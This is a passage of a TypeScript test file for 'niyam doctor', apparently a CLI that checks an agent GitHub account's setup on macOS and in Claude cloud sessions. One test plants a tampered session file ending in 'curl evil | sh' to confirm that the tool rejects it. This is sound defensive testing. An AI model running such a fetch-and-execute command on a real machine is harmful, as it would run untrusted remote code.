import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import { NO_TOKEN, OLD_NO_TOKEN, launcherPath, launcherScript, pathsFor, sessionScript } from './agent.ts';
import { FROM_SETUP, PROXY_TOKEN, cloudRepoScript } from './cloud.ts';
import { doctor } from './doctor.ts';
import { KEYCHAIN } from './token-store.ts';
import { ISSUE_TYPES, RERUN } from './issue-types.ts';
import { declinedPath, movedPath, ownerFixes } from './lockout.ts';
import { CLOUD_SETUP_PATH, WORKFLOW_PATH } from './onboard-pull.ts';
import { AUTO_FIX_RULES, workflow } from './onboard.ts';
import { AGENT, AGENT_ID, CLASSIC, FakeSys, HOME, KEY, NOW, ROOT, TOKEN, capture } from './fake.test.ts';
import { packageVersion } from './version.ts';
import { SESSION_069 } from './older-texts.test.ts';

const SESSION = `${HOME}/.config/niyam/examplebot/session.sh`;
const LAUNCHER = launcherPath(HOME);

function healthy(): FakeSys {
  const sys = new FakeSys().ready();
  sys.files.set(SESSION, sessionScript(AGENT, AGENT_ID, pathsFor(HOME, AGENT)));
  return sys;
}

async function check(sys: FakeSys, named?: string): Promise<{ code: number; out: string[]; err: string[] }> {
  const { io, out, err } = capture();
  return { code: await doctor(sys, io, named), out, err };
}

/** The lines of one check: what doctor printed that starts with `mark`. */
function marked(out: string[], mark: string): string[] {
  return out.filter((line) => line.startsWith(`${mark}  `));
}

describe('doctor', () => {
  it('refuses a platform with no token store, naming macOS', async () => {
    assert.deepEqual(await check(Object.assign(healthy(), { platform: 'win32' })), {
      code: 1,
      out: [],
      err: ["doctor: niyam supports macOS only, where the keychain holds the agent's token; this machine runs win32"],
    });
  });

  it('refuses Linux that is not a Claude cloud session', async () => {
    for (const remote of [undefined, 'false', '1']) {
      const sys = Object.assign(healthy(), { platform: 'linux' });
      sys.env = { ...sys.env, CLAUDE_CODE_REMOTE: remote };
      assert.deepEqual(await check(sys), {
        code: 1,
        out: [],
        err: ["doctor: niyam supports macOS only, where the keychain holds the agent's token; this machine runs linux"],
      });
    }
  });

  it('passes when the machine is set up, its checks grouped', async () => {
    assert.deepEqual(await check(healthy()), {
      code: 0,
      out: [
        '◆  niyam doctor   ExampleBot',
        '│',
        '◇  This Mac',
        '✓  signing key ~/.ssh/examplebot_signing',
        '✓  session file',
        '✓  launcher',
        `✓  niyam ${packageVersion()}, the newest release`,
        '│',
        '◇  GitHub — as ExampleBot',
        '✓  token, ends in 90 days',
        '✓  signing key registered',
        '✓  issue types in example-org: the work model’s alone, and every open issue here has one',
        '│',
        '└  All good',
      ],
      err: [],
    });
  });

  it('works with no terminal, uncoloured', async () => {
    const sys = healthy();
    sys.tty = false;
    sys.env = { ...sys.env, TERM: 'xterm-256color' };
    const { code, out } = await check(sys);
    assert.equal(code, 0);
    assert.ok(!out.some((line) => line.includes('\u001b[')));
    sys.tty = true;
    assert.ok((await check(sys)).out.some((line) => line.includes('\u001b[')), 'coloured on a terminal');
  });

  it('groups client hooks that reach GitHub outside as-agent under This repo, and still passes', async () => {
    const sys = healthy();
    sys.files.set('/repo/.claude/settings.json', JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'gh pr view' }] }] }, permissions: { allow: [...AUTO_FIX_RULES] } }));
    const { code, out, err } = await check(sys);
    assert.deepEqual({ code, err }, { code: 0, err: [] });
    assert.deepEqual(out.slice(-5), [
      '│',
      '◇  This repo',
      '▲  .claude/settings.json Stop hook "gh pr view" reaches GitHub outside as-agent, so gets 401 → run its gh or git via niyam as-agent --session <session_id> -- (exit 77 when not the agent)',
      '│',
      '└  1 to fix',
    ]);
  });

  it("names the Auto-fix rules the repo's Claude Code settings lack, and still passes", async () => {
    const sys = healthy();
    const settings = (allow: string[]): void => {
      sys.files.set(`${ROOT}/.claude/settings.json`, JSON.stringify({ permissions: { allow } }));
    };
    settings(['Bash(pnpm test)']);
    const fresh = await check(sys);
    assert.deepEqual({ code: fresh.code, err: fresh.err }, { code: 0, err: [] });
    assert.deepEqual(fresh.out.slice(-5), [
      '│',
      '◇  This repo',
      `▲  .claude/settings.json does not allow ${AUTO_FIX_RULES.join(', ')}, so agent sessions cannot turn Auto-fix on → niyam onboard again`,
      '│',
      '└  1 to fix',
    ]);
    settings(['mcp__ccd_pr__get_status']);
    assert.deepEqual(marked((await check(sys)).out, '▲'), [
      '▲  .claude/settings.json does not allow mcp__ccd_pr__bind_pr, mcp__ccd_pr__set_monitor, so agent sessions cannot turn Auto-fix on → niyam onboard again',
    ]);
    settings([...AUTO_FIX_RULES]);
    assert.equal((await check(sys)).out.at(-1), '└  All good');
    settings(['mcp__ccd_pr__*']);
    assert.equal((await check(sys)).out.at(-1), '└  All good', 'the whole server allowed');
  });

  it('says nothing about Auto-fix rules where the repo is not onboarded or its settings do not parse', async () => {
    const sys = healthy();
    sys.files.set(`${ROOT}/.claude/settings.json`, '{ not json');
    assert.equal((await check(sys)).out.at(-1), '└  All good');
    sys.files.set(`${ROOT}/.claude/settings.json`, '{}');
    sys.files.delete(`${ROOT}/.github/niyam.json`);
    assert.ok(!(await check(sys, AGENT)).out.some((line) => line.includes('Auto-fix')));
    const outside = healthy();
    outside.files.set(`${ROOT}/.claude/settings.json`, '{}');
    outside.inRepo = false;
    assert.ok(!(await check(outside, AGENT)).out.some((line) => line.includes('Auto-fix')));
  });

  it('gives the owner steps while the desktop app started before gh moved to the agent, and still passes', async () => {
    const sys = healthy();
    sys.files.set(movedPath(HOME, AGENT), JSON.stringify({ at: NOW.toISOString(), logins: ['example-owner'] }));
    sys.appStarted = new Date(NOW.getTime() - 3_600_000);
    const stale = await check(sys);
    assert.equal(stale.code, 0);
    assert.deepEqual(marked(stale.out, '▲'), ownerFixes(['example-owner']).map((fix) => `▲  ${fix.text} → ${fix.fix}`));
    assert.equal(stale.out.at(-1), '└  2 to fix');
    sys.appStarted = new Date(NOW.getTime() + 60_000);
    assert.deepEqual(marked((await check(sys)).out, '▲'), [], 'restarted since');
  });

  it("says nothing about a CODEOWNERS naming the owner: the owner keeps reviewing agent pull requests", async () => {
    const sys = healthy();
    sys.files.set('/repo/.github/CODEOWNERS', '* @example-owner\n');
    const { code, out } = await check(sys);
    assert.deepEqual({ code, last: out.at(-1) }, { code: 0, last: '└  All good' });
  });

  it('refuses a machine never set up, each problem with its fix', async () => {
    const { code, out, err } = await check(new FakeSys());
    assert.deepEqual({ code, err }, { code: 1, err: [] });
    assert.deepEqual(out, [
      '◆  niyam doctor   ExampleBot',
      '│',
      '◇  This Mac',
      '✗  ~/.ssh/examplebot_signing is missing → niyam machine',
      '✗  session file missing → niyam machine',
      '✗  launcher missing, so hooks need node on PATH → niyam machine',
      `✓  niyam ${packageVersion()}, the newest release`,
      '│',
      '◇  GitHub — as ExampleBot',
      "✗  no token in this Mac's keychain → niyam machine",
      '✗  signing key not registered → niyam machine',
      '│',
      '└  5 to fix',
    ]);
  });

  it('refuses a token GitHub rejects', async () => {
    const sys = healthy();
    sys.setToken(AGENT, 'revoked');
    const { code, out } = await check(sys);
    assert.equal(code, 1);
    assert.deepEqual(marked(out, '✗'), ['✗  token: GitHub refuses the token (expired or revoked?) → niyam machine']);
  });

  it("refuses a token that is someone else's", async () => {
    const sys = healthy();
    sys.setToken(AGENT, 'ghp_owners');
    sys.acceptToken('ghp_owners', 'example-owner');
    assert.deepEqual(marked((await check(sys)).out, '✗'), ['✗  token: the token acts as example-owner, not ExampleBot → niyam machine']);
  });

  it('refuses a fine-grained token', async () => {
    const sys = healthy();
    sys.setToken(AGENT, 'github_pat_x');
    sys.acceptToken('github_pat_x', AGENT, {});
    assert.deepEqual(marked((await check(sys)).out, '✗'), [
      '✗  token: it is not a classic token, which niyam needs (see its docs/decisions.md) → niyam machine',
    ]);
  });

  it('warns about a token near its end, and still passes', async () => {
    const sys = healthy();
    sys.acceptToken(TOKEN, AGENT, { ...CLASSIC, 'github-authentication-token-expiration': '2026-11-10 12:00:00 UTC' });
    const { code, out } = await check(sys);
    assert.equal(code, 0);
    assert.deepEqual(marked(out, '▲'), ['▲  token ends in 11 days → niyam machine']);
    assert.equal(out.at(-1), '└  1 to fix');
  });

  it('warns at 14 days, not at 15', async () => {
    for (const [ends, mark] of [['2026-11-13 12:00:00 UTC', '▲'], ['2026-11-14 12:00:00 UTC', '✓']] as const) {
      const sys = healthy();
      sys.acceptToken(TOKEN, AGENT, { ...CLASSIC, 'github-authentication-token-expiration': ends });
      assert.ok((await check(sys)).out.some((line) => line.startsWith(`${mark}  token`)), ends);
    }
  });

  it("uses GitHub's spelling of a login typed in another case", async () => {
    for (const typed of ['examplebot', 'EXAMPLEBOT']) assert.equal((await check(healthy(), typed)).code, 0, typed);
  });

  it("warns about the owner's credentials an agent session could reach, and still passes", async () => {
    const sys = healthy();
    sys.ghAccounts = ['example-owner'];
    sys.gitPassword = true;
    sys.files.set(`${HOME}/.ssh/id_ed25519`, 'open:key');
    const { code, out } = await check(sys);
    assert.equal(code, 0);
    assert.deepEqual(marked(out, '▲'), [
      '▲  gh is signed in as example-owner → niyam machine',
      '▲  a saved git password for github.com → niyam machine',
      '▲  ~/.ssh/id_ed25519 has no passphrase → ssh-keygen -p -f ~/.ssh/id_ed25519',
    ]);
    assert.equal(out.at(-1), '└  3 to fix');
  });

  it('warns about an owner-step folder left behind, saying when it holds a token, and still passes', async () => {
    const sys = healthy();
    sys.execOverride = (call) => (call.command === 'getconf' ? { code: 0, stdout: '/var/folders/xy/T/\n', stderr: '' } : undefined);
    sys.files.set('/var/folders/xy/T/niyam-owner-step-ab/hosts.yml', 'github.com:\n    oauth_token: gho_left\n');
    const { code, out } = await check(sys);
    assert.equal(code, 0);
    assert.deepEqual(marked(out, '▲'), [
      '▲  an owner-step folder left behind holds a GitHub token: /var/folders/xy/T/niyam-owner-step-ab → with no owner-step running, rm -rf /var/folders/xy/T/niyam-owner-step-ab, then revoke the GitHub CLI token at https://github.com/settings/applications',
    ]);
    assert.ok(!out.join('\n').includes('gho_left'));
  });

  it('reports a declined lockout as chosen, and warns about an account signed in since', async () => {
    const sys = healthy();
    sys.ghAccounts = ['example-owner', 'new-owner'];
    sys.gitPassword = true;
    sys.files.set(declinedPath(HOME, AGENT), JSON.stringify({ ghLogins: ['example-owner'], gitPassword: true }));
    const { code, out } = await check(sys);
    assert.equal(code, 0);
    assert.ok(out.includes('✓  gh stays signed in as example-owner, as you chose'));
    assert.ok(out.includes('✓  the saved git password for github.com stays, as you chose'));
    assert.deepEqual(marked(out, '▲'), ['▲  gh is signed in as new-owner → niyam machine']);
  });

  it('checks a named agent outside any repository', async () => {
    const sys = healthy();
    sys.inRepo = false;
    sys.files.delete('/repo/.github/niyam.json');
    assert.equal((await check(sys, AGENT)).code, 0);
  });

  it('refuses a key GitHub does not list', async () => {
    const sys = healthy();
    sys.route('GET', '/users/ExampleBot/ssh_signing_keys', { status: 200, json: [{ key: 'ssh-ed25519 other' }] });
    const { code, out } = await check(sys);
    assert.deepEqual({ code, broken: marked(out, '✗') }, { code: 1, broken: ['✗  signing key not registered → niyam machine'] });
  });

  it('refuses a key pair whose halves do not match, to be moved aside', async () => {
    const sys = healthy();
    sys.files.set(`${KEY}.pub`, 'ssh-ed25519 other');
    assert.deepEqual(marked((await check(sys)).out, '✗'), [
      '✗  ~/.ssh/examplebot_signing.pub does not match ~/.ssh/examplebot_signing → move it aside, then niyam machine',
      '✗  signing key not registered → niyam machine',
    ]);
  });

  it('names a launcher whose node is gone', async () => {
    const sys = healthy();
    sys.execOverride = (call) => (call.command === LAUNCHER ? { code: 127, stdout: '', stderr: '/gone/bin/node: not found\n' } : undefined);
    const { code, out } = await check(sys);
    assert.equal(code, 1);
    assert.deepEqual(marked(out, '✗'), ['✗  launcher does not run (/gone/bin/node: not found); its node removed? → niyam machine']);
    assert.equal(sys.calls.find((c) => c.command === LAUNCHER)?.env?.PATH, '/usr/bin:/bin', 'runs it without the PATH of this shell');
  });

  it('marks ✗ a launcher that runs the old process-rules command, which this release no longer installs (P-54)', async () => {
    const sys = healthy();
    sys.files.set(LAUNCHER, launcherScript('/opt/node/bin/node', '/x/dist/cli.js', '/home/u/Library/pnpm/bin/process-rules'));
    assert.deepEqual(marked((await check(sys)).out, '✗'), ["✗  launcher runs process-rules, niyam's old command, which this release no longer installs, so hooks may find no CLI → niyam upgrade, or niyam machine"]);
    sys.files.set(LAUNCHER, launcherScript('/opt/node/bin/node', '/x/dist/cli.js', '/home/u/Library/pnpm/bin/niyam'));
    assert.deepEqual(marked((await check(sys)).out, '✗'), []);
  });

  it('names a launcher that fails without saying why', async () => {
    const sys = healthy();
    sys.execOverride = (call) => (call.command === LAUNCHER ? { code: 3, stdout: '', stderr: '' } : undefined);
    assert.deepEqual(marked((await check(sys)).out, '✗'), ['✗  launcher does not run (exit 3); its node removed? → niyam machine']);
  });

  it('accepts a token whose login differs only in case', async () => {
    const sys = healthy();
    sys.acceptToken(TOKEN, 'examplebot');
    assert.equal((await check(sys)).code, 0);
  });

  it('names each check GitHub could not answer, and still runs the rest', async () => {
    const sys = healthy();
    sys.http = () => Promise.reject(new Error('rate limited'));
    const { code, out } = await check(sys);
    assert.equal(code, 1);
    assert.deepEqual(marked(out, '✓'), ['✓  signing key ~/.ssh/examplebot_signing', '✓  launcher']);
    assert.deepEqual(marked(out, '✗'), [
      '✗  session file: cannot ask GitHub (rate limited) → niyam doctor again',
      '✗  token: cannot ask GitHub (rate limited) → niyam doctor again',
      '✗  signing key: cannot ask GitHub (rate limited) → niyam doctor again',
      '✗  issue types: cannot ask GitHub (rate limited) → niyam doctor again',
    ]);
  });

  describe('issue types', () => {
    const typed = (sys: FakeSys, types: { name: string; is_enabled: boolean }[]): FakeSys =>
      sys.route('GET', '/orgs/example-org/issue-types?per_page=100&page=1', { status: 200, json: types.map((type, index) => ({ id: index + 1, description: null, color: null, ...type })) });
    const MODEL = ISSUE_TYPES.map((type) => ({ name: type.name, is_enabled: true }));

    it('warns about types outside the work model and the issues here holding one, and still passes', async () => {
      const sys = typed(healthy(), [...MODEL, { name: 'Task', is_enabled: true }, { name: 'Bug', is_enabled: true }, { name: 'Feature', is_enabled: false }]);
      sys.route('GET', '/repos/example-org/example-app/issues?type=Task&state=all&per_page=100&page=1', {
        status: 200,
        json: [
          { number: 9, url: 'https://api.github.com/repos/example-org/example-app/issues/9', type: { name: 'Task' } },
          { number: 10, url: 'https://api.github.com/repos/example-org/example-app/pull/10', type: null, pull_request: {} },
        ],
      });
      sys.route('GET', '/repos/example-org/example-app/issues?type=Bug&state=all&per_page=100&page=1', { status: 200, json: [] });
      const { code, out } = await check(sys);
      assert.equal(code, 0);
      assert.deepEqual(marked(out, '▲'), [`▲  example-org has issue types outside the work model: Task, Bug; 1 issue here holds one (#9 Task) → ${RERUN}`]);
    });

    it('warns about open issues here with no type, but the Approvals issue the settings name', async () => {
      const sys = typed(healthy(), MODEL);
      sys.files.set(`${ROOT}/.github/niyam.json`, JSON.stringify({ owner: 'example-owner', agent: AGENT, features: ['identity', 'board'], approvals: 3 }));
      const row = (number: number) => ({ number, url: `https://api.github.com/repos/example-org/example-app/issues/${number}`, type: null });
      sys.route('GET', '/repos/example-org/example-app/issues?type=none&state=open&per_page=100&page=1', { status: 200, json: [row(3), row(4), row(5)] });
      const { code, out } = await check(sys);
      assert.equal(code, 0);
      assert.deepEqual(marked(out, '▲'), [`▲  2 open issues here have no type (#4, #5) → ${RERUN}`]);
      sys.route('GET', '/repos/example-org/example-app/issues?type=none&state=open&per_page=100&page=1', { status: 200, json: [row(3), row(4)] });
      assert.deepEqual(marked((await check(sys)).out, '▲'), [`▲  1 open issue here has no type (#4) → ${RERUN}`]);
    });

    it("warns about a work model type the organisation lacks or disabled", async () => {
      const sys = typed(healthy(), MODEL.map((type) => (type.name === 'Slice' ? { ...type, is_enabled: false } : type)).filter((type) => type.name !== 'Brief'));
      const { code, out } = await check(sys);
      assert.equal(code, 0);
      assert.deepEqual(marked(out, '▲'), [`▲  example-org lacks the work model's Slice, Brief → ${RERUN}`]);
    });

    it('checks nothing for a personal repository, settings without the board, or outside a clone', async () => {
      const personal = healthy();
      personal.ownerType = 'User';
      const off = healthy();
      off.files.set(`${ROOT}/.github/niyam.json`, JSON.stringify({ owner: 'example-owner', agent: AGENT, features: ['identity', 'work-rules'] }));
      const outside = healthy();
      outside.inRepo = false;
      for (const sys of [personal, off, outside]) {
        const { code, out } = await check(sys, sys === outside ? AGENT : undefined);
        assert.equal(code, 0);
        assert.ok(!out.some((line) => line.includes('issue types')), out.join('\n'));
        assert.ok(!sys.requests.some((request) => request.url.includes('/issue-types')));
      }
    });
  });

  it('reports a thrown non-error from GitHub', async () => {
    const sys = healthy();
    sys.http = () => Promise.reject('down');
    assert.ok((await check(sys)).out.includes('✗  token: cannot ask GitHub (down) → niyam doctor again'));
  });

  it('warns of a session file a release before niyam wrote, which still works (P-50)', async () => {
    const sys = healthy();
    // A Mac set up before niyam: the token under the old keychain service alone.
    const token = sys.keychain.get(`niyam/${AGENT}`) as string;
    sys.keychain.delete(`niyam/${AGENT}`);
    sys.keychain.set(`process-rules/${AGENT}`, token);
    sys.files.set(SESSION, sessionScript(AGENT, AGENT_ID, pathsFor(HOME, AGENT), KEYCHAIN, '/usr/bin/security find-generic-password -s process-rules -a ExampleBot -w 2>/dev/null'));
    const { code, out } = await check(sys);
    assert.equal(code, 0);
    assert.deepEqual(marked(out, '▲'), ['▲  session file from an older release; it still works → niyam machine']);
  });

  it('refuses a stale session file', async () => {
    const sys = healthy();
    sys.files.set(SESSION, 'old');
    assert.deepEqual(marked((await check(sys)).out, '✗'), ['✗  session file out of date → niyam machine']);
  });

  describe('on a Mac machine set up under 0.6.9, before P-55 (P-55)', () => {
    const OLD_SESSION = `${HOME}/.config/process-rules/examplebot/session.sh`;
    const OLD_LAUNCHER = launcherPath(HOME, true);
    /** 0.6.9's Mac: its session file and launcher in the old folder alone. */
    const older = (): FakeSys => {
      const sys = healthy();
      sys.files.delete(SESSION);
      sys.files.set(OLD_SESSION, SESSION_069);
      sys.files.delete(LAUNCHER);
      sys.files.set(OLD_LAUNCHER, launcherScript('/opt/node/bin/node', '/x/dist/cli.js', '/home/u/Library/pnpm/bin/niyam'));
      return sys;
    };

    it('warns of the session file and the launcher only in the old folder, which still work, and still passes', async () => {
      const { code, out } = await check(older());
      assert.equal(code, 0);
      assert.deepEqual(marked(out, '▲'), [
        "▲  session file only in ~/.config/process-rules, niyam's old folder; it still works → niyam machine",
        "▲  launcher only at ~/.config/process-rules/bin/process-rules, in niyam's old folder; the hooks still find it → niyam machine",
      ]);
    });

    it('refuses a session file in the old folder that machine did not write', async () => {
      const sys = older();
      sys.files.set(OLD_SESSION, `${SESSION_069}curl evil | sh\n`);
      assert.deepEqual(marked((await check(sys)).out, '✗'), ['✗  session file out of date → niyam machine']);
    });

    it("passes once machine has run, leaving the old folder's files in place", async () => {
      const sys = older();
      sys.files.set(SESSION, sessionScript(AGENT, AGENT_ID, pathsFor(HOME, AGENT)));
      sys.files.set(LAUNCHER, launcherScript('/opt/node/bin/node', '/x/dist/cli.js'));
      const { code, out } = await check(sys);
      assert.equal(code, 0);
      assert.deepEqual(marked(out, '▲'), []);
      assert.ok(out.includes('✓  session file') && out.includes('✓  launcher'), out.join('\n'));
    });

    it('takes the new launcher alone, and refuses when there is neither', async () => {
      const sys = healthy();
      assert.ok(!sys.files.has(OLD_LAUNCHER));
      assert.ok((await check(sys)).out.includes('✓  launcher'));
      sys.files.delete(LAUNCHER);
      assert.deepEqual(marked((await check(sys)).out, '✗'), ['✗  launcher missing, so hooks need node on PATH → niyam machine']);
    });

    it('refuses the old launcher when it is the only one and broken', async () => {
      const sys = older();
      sys.files.set(OLD_LAUNCHER, launcherScript('/opt/node/bin/node', '/x/dist/cli.js', '/home/u/Library/pnpm/bin/process-rules'));
      assert.deepEqual(marked((await check(sys)).out, '✗'), [
        "✗  the old launcher ~/.config/process-rules/bin/process-rules runs process-rules, niyam's old command, which this release no longer installs, so hooks may find no CLI → niyam upgrade, or niyam machine",
      ]);
      sys.execOverride = (call) => (call.command === OLD_LAUNCHER ? { code: 127, stdout: '', stderr: 'node: not found\n' } : undefined);
      assert.deepEqual(marked((await check(sys)).out, '✗'), ['✗  the old launcher ~/.config/process-rules/bin/process-rules does not run (node: not found); its node removed? → niyam machine']);
    });

    it('checks the old launcher beside the new one too, since hooks 0.6.8 and 0.6.9 wrote still run it', async () => {
      const sys = older();
      sys.files.set(LAUNCHER, launcherScript('/opt/node/bin/node', '/x/dist/cli.js'));
      const fine = await check(sys);
      assert.ok(fine.out.includes('✓  launcher'));
      assert.deepEqual(marked(fine.out, '✗'), [], 'a working old one beside the new one is fine');
      sys.files.set(OLD_LAUNCHER, launcherScript('/opt/node/bin/node', '/x/dist/cli.js', '/home/u/Library/pnpm/bin/process-rules'));
      const stale = await check(sys);
      assert.equal(stale.code, 1);
      assert.ok(stale.out.includes('✓  launcher'));
      assert.deepEqual(marked(stale.out, '✗'), [
        "✗  the old launcher ~/.config/process-rules/bin/process-rules, which hooks 0.6.8 and 0.6.9 wrote run, runs process-rules, niyam's old command, which this release no longer installs, so hooks may find no CLI → niyam upgrade",
      ]);
      sys.execOverride = (call) => (call.command === OLD_LAUNCHER ? { code: 127, stdout: '', stderr: 'node: not found\n' } : undefined);
      assert.deepEqual(marked((await check(sys)).out, '✗'), [
        '✗  the old launcher ~/.config/process-rules/bin/process-rules, which hooks 0.6.8 and 0.6.9 wrote run, does not run (node: not found); its node removed? → rm ~/.config/process-rules/bin/process-rules',
      ]);
    });
  });
});

describe('doctor in a Claude cloud session', () => {
  const v = packageVersion();
  const WORKFLOW = `${ROOT}/${WORKFLOW_PATH}`;
  const CLOUD_FILE = `${ROOT}/${CLOUD_SETUP_PATH}`;
  const PASTE = "paste what niyam cloud-setup prints into the cloud environment's Setup script, once";

  /**
   * A cloud session session-start gave the agent's identity, in a clone whose
   * workflow pins this CLI and whose cloud setup file installs it, set up by
   * the Setup snippet: no keychain, GitHub reached through the proxy as `login`.
   */
  function cloud(login: string | null = AGENT): FakeSys {
    const sys = new FakeSys();
    sys.platform = 'linux';
    sys.env = { CLAUDE_CODE_REMOTE: 'true', GH_TOKEN: PROXY_TOKEN, PROCESS_RULES_AGENT: AGENT };
    sys.files.set(WORKFLOW, workflow('main', v, false));
    sys.files.set(CLOUD_FILE, cloudRepoScript(v, 'ab'.repeat(32)));
    sys.files.set(FROM_SETUP, '');
    if (login) sys.acceptToken(PROXY_TOKEN, login);
    return sys;
  }

  it('passes when the environment is set up, its checks grouped as on a Mac', async () => {
    const sys = cloud();
    assert.deepEqual(await check(sys), {
      code: 0,
      out: [
        '◆  niyam doctor   ExampleBot',
        '│',
        '◇  This cloud session',
        `✓  ${CLOUD_SETUP_PATH} installs ${v}, as ${WORKFLOW_PATH} pins`,
        `✓  niyam ${v} runs here`,
        `✓  the Setup script runs ${CLOUD_SETUP_PATH}`,
        '│',
        '◇  GitHub — as ExampleBot',
        "✓  the proxy acts as ExampleBot, an agent the repo's settings name",
        "✓  session-start gave this session ExampleBot's identity",
        '│',
        '└  All good',
      ],
      err: [],
    });
    assert.equal(sys.requests.at(-1)?.token, PROXY_TOKEN, 'asks through the proxy');
    assert.ok(!sys.calls.some((call) => call.command.endsWith('security')), 'no keychain');
  });

  it('says to run onboard again when the cloud setup file and the pin disagree', async () => {
    const sys = cloud();
    sys.files.set(WORKFLOW, workflow('main', '0.0.1', false));
    const { code, out } = await check(sys);
    assert.equal(code, 1);
    assert.deepEqual(marked(out, '✗'), [`✗  ${CLOUD_SETUP_PATH} installs ${v}, but ${WORKFLOW_PATH} pins v0.0.1 → niyam onboard again`]);
  });

  it('says to run onboard again when the repo has no cloud setup file, or one onboard did not write', async () => {
    for (const file of [undefined, '#!/bin/bash\necho mine\n']) {
      const sys = cloud();
      if (file === undefined) sys.files.delete(CLOUD_FILE);
      else sys.files.set(CLOUD_FILE, file);
      const { code, out } = await check(sys);
      assert.equal(code, 1);
      assert.deepEqual(marked(out, '✗'), [
        `✗  ${CLOUD_SETUP_PATH} missing, or not the file onboard writes, so the Setup script installs no niyam → niyam onboard again`,
      ]);
      assert.ok(out.includes(`✓  niyam ${v} runs here`), 'still checked against the pin');
    }
  });

  it('warns when the workflow pins no one version, and still passes', async () => {
    for (const pins of [undefined, workflow('main', v, false).replace(`process-rules-ref: v${v}`, 'process-rules-ref: v0.0.2')]) {
      const sys = cloud();
      if (pins === undefined) sys.files.delete(WORKFLOW);
      else sys.files.set(WORKFLOW, pins);
      const { code, out } = await check(sys);
      assert.equal(code, 0);
      assert.deepEqual(marked(out, '▲'), [
        `▲  ${WORKFLOW_PATH} is missing or pins no one version, so ${CLOUD_SETUP_PATH} is not checked against it → niyam onboard again`,
      ]);
    }
  });

  it('warns when this session runs another release than the repo installs, and still passes', async () => {
    const sys = cloud();
    sys.files.set(WORKFLOW, workflow('main', '0.0.1', false));
    sys.files.set(CLOUD_FILE, cloudRepoScript('0.0.1', 'ab'.repeat(32)));
    const { code, out } = await check(sys);
    assert.equal(code, 0);
    assert.deepEqual(marked(out, '▲'), [`▲  this session runs niyam ${v}, not the 0.0.1 ${CLOUD_SETUP_PATH} installs → bash ${CLOUD_SETUP_PATH}, or a new session`]);
    assert.ok(!sys.calls.some((call) => call.command === 'bash'), 'only reads: installs nothing');
  });

  it('warns about a release the workflow pins that no cloud setup file installs', async () => {
    const sys = cloud();
    sys.files.delete(CLOUD_FILE);
    sys.files.set(WORKFLOW, workflow('main', '0.0.1', false));
    assert.deepEqual(marked((await check(sys)).out, '▲'), [
      `▲  this session runs niyam ${v}, not the v0.0.1 ${WORKFLOW_PATH} pins → niyam onboard again, then a new session`,
    ]);
  });

  it('asks for the one paste when the Setup script did not run the repo file, and still passes', async () => {
    const sys = cloud();
    sys.files.delete(FROM_SETUP);
    const { code, out } = await check(sys);
    assert.equal(code, 0);
    assert.deepEqual(marked(out, '▲'), [`▲  ${FROM_SETUP} missing, so the cloud environment's Setup script does not run ${CLOUD_SETUP_PATH} → ${PASTE}`]);
    assert.equal((await check(sys)).out.at(-1), '└  1 to fix');
  });

  it('refuses a proxy that acts as an account not among the agents', async () => {
    const sys = cloud('example-owner');
    sys.env.PROCESS_RULES_AGENT = undefined;
    const { code, out } = await check(sys);
    assert.equal(code, 1);
    assert.equal(out[0], '◆  niyam doctor   example-owner');
    assert.ok(out.includes('◇  GitHub — as example-owner'));
    assert.deepEqual(marked(out, '✗'), [
      "✗  the proxy acts as example-owner, not ExampleBot → connect claude.ai's GitHub as ExampleBot",
      '✗  session-start did not give this session the agent identity, so gh and git stay locked out → a new session; its first niyam line says why',
    ]);
  });

  it('accepts a login that differs only in case, and the agent named', async () => {
    const sys = cloud('examplebot');
    assert.equal((await check(sys)).code, 0);
    assert.equal((await check(cloud(), 'OtherBot')).code, 1, 'checked against the agent named');
  });

  it('names a proxy GitHub could not answer, and still runs the rest', async () => {
    const down = cloud(null);
    const { code, out } = await check(down);
    assert.equal(code, 1);
    assert.equal(out[0], '◆  niyam doctor   ExampleBot');
    assert.deepEqual(marked(out, '✗'), ['✗  GitHub answered HTTP 401 when asked who this session is → niyam doctor again']);
    const thrown = cloud();
    thrown.http = () => Promise.reject(new Error('ECONNRESET'));
    assert.deepEqual(marked((await check(thrown)).out, '✗'), ['✗  GitHub could not be asked who this session is (ECONNRESET) → niyam doctor again']);
  });

  it('refuses a session session-start left locked out, or gave an account the settings do not name', async () => {
    const locked = cloud();
    locked.env = { CLAUDE_CODE_REMOTE: 'true', GH_TOKEN: NO_TOKEN };
    locked.acceptToken(PROXY_TOKEN, AGENT);
    const { code, out } = await check(locked);
    assert.equal(code, 1);
    assert.ok(out.includes("✓  the proxy acts as ExampleBot, an agent the repo's settings name"), 'asks with the proxy placeholder, never the lock');
    assert.deepEqual(marked(out, '✗'), [
      '✗  session-start did not give this session the agent identity, so gh and git stay locked out → a new session; its first niyam line says why',
    ]);
    const other = cloud();
    other.env.PROCESS_RULES_AGENT = 'OtherBot';
    assert.deepEqual(marked((await check(other)).out, '✗'), [
      '✗  session-start did not give this session the agent identity, so gh and git stay locked out → a new session; its first niyam line says why',
    ]);
  });

  it('takes the identity session-start gave by NIYAM_AGENT, PROCESS_RULES_AGENT or both (P-55)', async () => {
    for (const named of [{ NIYAM_AGENT: AGENT }, { PROCESS_RULES_AGENT: AGENT }, { NIYAM_AGENT: AGENT, PROCESS_RULES_AGENT: AGENT }, { NIYAM_AGENT: '', PROCESS_RULES_AGENT: AGENT }]) {
      const sys = cloud();
      sys.env = { CLAUDE_CODE_REMOTE: 'true', GH_TOKEN: PROXY_TOKEN, ...named };
      const { code, out } = await check(sys);
      assert.equal(code, 0, JSON.stringify(named));
      assert.ok(out.includes("✓  session-start gave this session ExampleBot's identity"), JSON.stringify(named));
    }
    const other = cloud();
    other.env = { CLAUDE_CODE_REMOTE: 'true', GH_TOKEN: PROXY_TOKEN, NIYAM_AGENT: 'OtherBot' };
    assert.equal((await check(other)).code, 1);
  });

  it("asks GitHub with the proxy's placeholder in a session 0.6.9's lock left locked out, never that lock's token (P-55)", async () => {
    const locked = cloud();
    locked.env = { CLAUDE_CODE_REMOTE: 'true', GH_TOKEN: OLD_NO_TOKEN };
    locked.acceptToken(PROXY_TOKEN, AGENT);
    const { code, out } = await check(locked);
    assert.equal(code, 1);
    assert.ok(out.includes("✓  the proxy acts as ExampleBot, an agent the repo's settings name"), out.join('\n'));
  });

  it('refuses an identity session-start gave that is not the account the proxy acts as now', async () => {
    const sys = cloud('SecondBot');
    sys.files.set(`${ROOT}/.github/niyam.json`, JSON.stringify({ owner: 'example-owner', agent: [AGENT, 'SecondBot'] }));
    const { code, out } = await check(sys);
